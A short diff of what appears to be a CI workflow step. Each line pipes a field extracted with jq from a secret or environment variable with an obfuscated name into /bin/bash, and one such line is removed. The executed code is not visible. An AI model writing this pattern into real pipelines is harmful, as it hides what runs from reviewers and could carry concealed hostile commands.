@@ -21,7 +21,6 @@ jobs:
           kqlas89: ${{ secrets.kqlas89 }}
         run: |
           printf '%s' "$kqlas89" | jq -r .ar8 | /bin/bash
-          echo $ipopg739 | jq -r .rwfca6 | /bin/bash
           echo $hj915 | jq -r .njqv826 | /bin/bash
           echo $oaml90202 | jq -r .t119 | /bin/bash
           printf '%s' "$smb37" | jq -r .yihq281 | /bin/bash
